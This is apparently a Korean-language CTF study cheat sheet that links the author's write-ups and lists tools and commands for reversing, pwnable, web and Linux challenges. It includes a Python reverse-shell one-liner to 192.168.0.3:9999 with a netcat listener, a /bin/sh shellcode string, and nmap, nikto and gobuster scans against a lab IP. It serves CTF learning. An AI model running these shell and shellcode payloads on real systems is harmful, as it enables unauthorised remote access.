- 디 어셈블러 - 바이너리 코드의 어셈블리 코드 확인
- 디 컴파일러 - 바이너리 코드로 부터 원래의 코드 확인

리버싱을 하려면 디 컴파일러가 필요합니다. 유명한 도구는 IDA인데 가격이 비싸서, 무료인 기드라를 사용합니다. 

- 문자열 검색
    - [[shell ctf 2022] Pulling the strings](https://skyepodium.tistory.com/entry/shell-ctf-2022-Pulling-the-strings)

- 코드 분석
    - [[shell ctf 2022] Keygen](https://skyepodium.tistory.com/entry/shell-ctf-2022-Keygen)

    - [[shell ctf 2022] warmup](https://skyepodium.tistory.com/entry/shell-ctf-2022-warmup)
### 2) [jadx-gui](https://velog.io/@skyepodium/%EB%A7%A5-jadx-gui-%EC%84%A4%EC%B9%98)
jar를 디컴파일 하는 경우 jadx-gui를 사용합니다.

### 3) [인텔리제이](https://www.jetbrains.com/ko-kr/idea/download/#section=mac)
.class를 디컴파일 하는데 사용할 수 있습니다.
- [[b01lers CTF] I Love Java](https://skyepodium.tistory.com/entry/b01lers-CTF-I-Love-Java) - 자바 .class 파일 디컴파일


# 8. pwnable 🔥🔥🔥
### 1) [pwntools](https://github.com/Gallopsled/pwntools)
exploit 파이썬 라이브러리, 기본으로 사용합니다.

파이썬2 기반이어서 가상환경 구축하고 사용합니다.
```shell
virtualenv pyvenv2 --python=python2.7

source pyvenv2/bin/activate

pip2 install pwntools
```

### 2) 쉘코드
[쉘스톰 - 쉘코드 모음](http://shell-storm.org/shellcode/)

```
// 32bit - 26 바이트
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
```
### 3) 코드 분석
- [CyberYoddha CTF - Password 1](https://velog.io/@skyepodium/CyberYoddha-CTF-Writeup#1-password-1)


### 3) Buffer over flow 🔥
포너블의 시작, 버퍼 오버 플로우에서 시작합니다. 정말 중요
- [[H4CKING GAME] - Qualification](https://skyepodium.tistory.com/entry/H4CKING-GAME-Qualification)
- [0xL4ugh CTF - Leak](https://velog.io/@skyepodium/0xL4ugh-CTF-writeup#3-leak)
- [meta CTF - Baffling Buffer 0](https://velog.io/@skyepodium/Meta-CTF-Writeup#1-baffling-buffer-0)
- [meta CTF - Baffling Buffer 1](https://velog.io/@skyepodium/Meta-CTF-Writeup#2-baffling-buffer-1)

### 4) format string 🔥
포맷 스트링 공격 몇번 해보면 감이 옵니다.
- [0xL4ugh CTF - Trigger Happy](https://velog.io/@skyepodium/0xL4ugh-CTF-writeup#2-trigger-happy)

# 9. programming
보안과는 관련없이 프로그래밍을 하는 문제가 있습니다. 파이썬을 사용하면 정말 유리합니다.
- [[pwnable.kr] coin1](https://velog.io/@skyepodium/pwnable-coin1)
- [[HSCTF 9] travelling-salesman](https://skyepodium.tistory.com/entry/HSCTF-9-travelling-salesman)
- [[HSCTF 9] vending-machine](https://skyepodium.tistory.com/entry/HSCTF-9-vending-machine)

# 10. 기타
### 1) robots.txt
robots.txt는 웹 크롤러가 해당 경로에 접근하지 말라는 의미로 domain/robots.txt에 지정합니다.

robot 어쩌구 저쩌구 나오면 힌트가 있을 확률이 높고, 그것이 아니더라도 여러 CTF 대회에서 먼저 확인하는 부분중 하나 입니다.
- [[ctflearn] Where Can My Robot Go?](https://skyepodium.tistory.com/entry/ctflearn-Where-Can-My-Robot-Go?category=1029036)
- [pico CTF - where are the robots](https://play.picoctf.org/practice?category=1&page=1&search=where%20are%20the%20robots)

### 2) [매직 해시](https://github.com/skyepodium/ctf-starter-hidiot/blob/main/hash/magic-hash.md)
불리언 문맥에서 0으로 평가받을 수 있는 해시들의 모음입니다.

### 3) [정규 표현식](https://velog.io/@skyepodium/%EC%A0%95%EA%B7%9C%ED%91%9C%ED%98%84%EC%8B%9D-%EC%95%8C%EC%95%84%EB%B3%B4%EA%B8%B0)
- [[NahamCon_CTF_2022] personnel](https://skyepodium.tistory.com/entry/NahamConCTF2022-personnel)

### 4)[인터넷 아카이브](https://archive.org/)
쉬운 대회에서 종종 나옵니다. 웹사이트가 과거 특정시기에 어떻게 보이는지 아카이빙을 검색하는 문제입니다.

- [[ctflearn] Time Traveller](https://skyepodium.tistory.com/entry/ctflearn-Time-Traveller)

# 11. 팁
### 1) | 파이프라인
다음과 같이 쓰는 경우가 많습니다. `|` 파이프라인은 앞의 결과를 뒤 함수의 인풋으로 넣습니다.
```
cat flag.txt | grep flag{
```
### 2) grep
grep 은 특정 내용이 포함된 문자열을 필터링 하는 함수입니다.
```
cat flag.txt | grep flag{
```
### 3) 맥북 아이피 확인
```
ifconfig | grep inet
```

### 4) ls -al
숨겨진 파일을 찾습니다.
[[ctflearn] Taking LS](https://skyepodium.tistory.com/entry/ctflearn-Taking-LS?category=1029036)

### 5) https 서버
만약 사이트가 https 프로토콜을 사용하고, 로컬의 서버가 http이면 전송이 불가능합니다.(https -> http 요청 불가)

따라서, https 서버가 필요하면 [post bin](https://www.toptal.com/developers/postbin/), [request bin](https://requestbin.com/)을 사용할 수 있습니다. 사용법은 간단합니다.

### 6) Discord
flag 준다고 Discord 들어오라는 경우가 있습니다.

막상 들어가도 어디있는지 못찾는 경우가 있는데, 대부분 사진처럼 최상단에 있습니다.

![cover](./images/discord.png)

### 7) writeup 🔥🔥🔥
wirteup은 어떻게 문제를 풀었는지 기술하는 과정입니다.

대회가 끝나면 [CTF TIME](https://ctftime.org/event/1660/tasks/) 에 업로드 되기도 하고 googling, youtube로 검색됩니다.
![cover](./images/writeup.png)

개인적으로 한문제 풀때마다 블로그에 비공개로 writeup 작성하는게 좋은것 같습니다. 정말로, 문제 풀고, 대회 끝나면 잘 기억 안납니다.

나중에 비슷한 문제 만나도 접근하기 힘들어지고 아쉬움만 남습니다.

그래서 그냥 블로그에 비공개로 막쓰는것 추천, 네이버, 티스토리 이런곳에 편하게
개인적으로 깃허브 프라이빗에 써봤는데 이미지 넣는것이 힘들어서 비추

### 8) MD5 Hash
사진 처럼 다운로드 파일에 MD5 Hash를 함께 적어주는 경우가 있습니다.

이것은 해당 파일이 위조되지 않았음을 보장하기 위해 MD5 Hash를 적어줍니다.

우측은 [MySQL workbench](https://dev.mysql.com/downloads/workbench/) 의 사례입니다.

![cover](./images/md5.png)

그리고, CTF에서 조금 특별한 의미를 가지는데 [virus total](https://www.virustotal.com/gui/home/upload) 에서 MD5 해시를 통해서 파일이 등록된 바이러스인지 여부를 알려줍니다.

예전에 참가했던 대회에서 관련 문제가 있었는데 기록해 놓지 않아서, 예제가 없습니다. 혹시라도 다음에 만나게 된다면, 적어놓을께요


# 12. 리눅스
### 1) 현재 디렉토리에서 문자열 찾기
```
grep -rn "flag"
```
- [[HSCTF 9] the-great-directory-egg-hunt](https://skyepodium.tistory.com/entry/HSCTF-9-the-great-directory-egg-hunt)

- [[pico CTF] Big Zip](https://skyepodium.tistory.com/entry/pico-CTF-Big-Zip)

### 2) 파일 찾기    
2> /dev/null 은 에러메시지를 안보이게 합니다.
```
find . -name '*.txt' 2> /dev/null
```
- [[pico CTF] First Find](https://skyepodium.tistory.com/entry/pico-CTF-First-Find)


### 3) file
파일의 유형을 알려줍니다.

file은 매직 해시를 보고 판단하기 때문에 확장자가 잘못 작성된 경우에 원래의 파일을 추측하는데 사용할 수 있습니다.
```
file 1.png

1.txt: ASCII text
```

- [[DigitalForensic] with CTF - e_e](https://skyepodium.tistory.com/entry/DigitalForensic-with-CTF-ee)

- [[ctflearn] 07601](https://skyepodium.tistory.com/entry/ctflearn-07601)

### 4) base64
```
echo SGVsbG8gV29ybGQ= | base64 -d

Hello World
```

### 5) md5 해시 생성
```
md5sum 1.txt
```

### 6) 현재 디렉토리 파일의 개수
```
ls -l | grep ^- | wc -l
```

### 7) 현재 디렉토리 디렉토리의 개수
```
ls -l | grep ^d | wc -l​
```

### 8) tac
파일 거꾸로 읽기, cat의 반대버전
```
tac a.txt
```

### 9) 디렉토리 알파벳 역순 - reverse
```
ls -r
```

### 10) 출력 리다이렉션 (input redirection operator)
```
curl 요청 결과 html 로 만들기
curl https://www.google.com > a.html

netcat 요청 결과 파일로 만들기
nc jupiter.challenges.picoctf.org 4427 > 1.txt

파일 목록 조회 결과 txt로 만들기
ls -al > ls.txt
```

### 11) 입력 리다이렉션 (output redirection operator)
입력 결과를 다른 입력으로 이동
```
cat < 1.txt
```


# 13. curl
### 1) 기본 사용법
```
curl -X GET https://www.google.com
```

### 2) 요청 결과 파일로 만들기
```
curl -X GET https://www.google.com --output - > 1.txt
```

### 3) 헤더 추가
http range request 예시
```
curl -X GET -H 'Range: bytes=0-10239' https://www.google.com

curl -r 0-10230 https://www.google.com
```

# 14. cat
### 1) 기본 사용
조회
```
cat 1.txt
```

### 2) 파일 합치기
바이너리 순서로 합칩니다.
```
cat 1.txt 2.txt -> 3.txt
```

# 15. 자바스크립트
### 1) 부동 소수점
JS의 모든 숫자는 부동 소수점을 사용하며, 안전한 계산 범위는 `-(2^53 - 1)` ~ `2^53 -1` 입니다.

이 범위를 넘어가는 모든 숫자는 홀수, 짝수 관계없이 2의 배수로 표현됩니다. 
- [[Square CTF 2021] Huge Primes](https://skyepodium.tistory.com/entry/Square-CTF-2021-Huge-Primes)

### 2) 유니코드 - 한글필터 백도어
[한글필터](https://www.compart.com/en/unicode/U+3164)는 유니코드이며 이를 통해 눈에 안보이는 백도어를 만든 문제입니다.
- [Square CTF 2021 - Korean Space Program (feat: 투명 백도어)](https://velog.io/@skyepodium/Square-CTF-2021-Korean-Space-Program-feat-%ED%88%AC%EB%AA%85-%EB%B0%B1%EB%8F%84%EC%96%B4)

# 16. flask
### 1) 플라스크 세션 조작
- [[pico CTF] Most Cookies](https://skyepodium.tistory.com/entry/pico-CTF-Most-Cookies)

# 17. macro
문서 파일에 포함되어 있는 매크로 문제
- [[TryHackMe] Mr. Phisher](https://skyepodium.tistory.com/entry/TryHackMe-Mr-Phisher)

# 18. requets
그냥 자주쓰는것 적어놓으려고
### 1) get
```python
import requests

r = requests.get("https://www.google.com")

res = {"header": r.headers, "body": r.text}

print('res', res)
```

### 2) post
```python
import requests

data = {'name': 'snickerdoodle'}

res = requests.post("http://mercury.picoctf.net:44693/search", data=data)
```

### 3) post - form
```python
import requests

session = requests.Session()
r = session.post('http://mercury.picoctf.net:44693/search', data={'name': "snickerdoodle"})

cookie = r.headers["Set-Cookie"].split("; ")[0]
print('cookie', cookie)
# cookie session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YqYw8w.fA59ny4Zdysw-0EsKpW12QKzIno
```

### 4) cookie
```python
import requests

headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {'session': 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YqYw8w.fA59ny4Zdysw-0EsKpW12QKzIno'}

res = requests.get("http://mercury.picoctf.net:44693/search", headers=headers, cookies=cookies)
```

# 19. nmap
```
nmap -sC -sV -oN nmap/initial 10.10.246.239
```

# 20. nikto
```
nikto -h http://10.10.246.239 | tee nikto.log
```

# 21. gobuster
url 스캔
```
gobuster dir -u http://10.10.246.239 -w /Users/skyepodium/pwnable/wordlist/node-dirbuster/lists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

# 22. linux read file
```
# readfile
cat
tac
head
tail
while read line; do echo $line; done < clue.txt
grep . clue.txt

# read all file in directory
grep -R .

### editor
more
nano
vim
vi
```

# 23. reverse shell
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### 1) netcat port listening
```
nc -lvn 9999
```

### 2) open
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.3",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh", "-i"]);'
```

# 24. root 권한
### 1) sudo 옵션 확인
```
sudo -l
```

### 2) root 권한 얻기
```
sudo su
sudo bash
```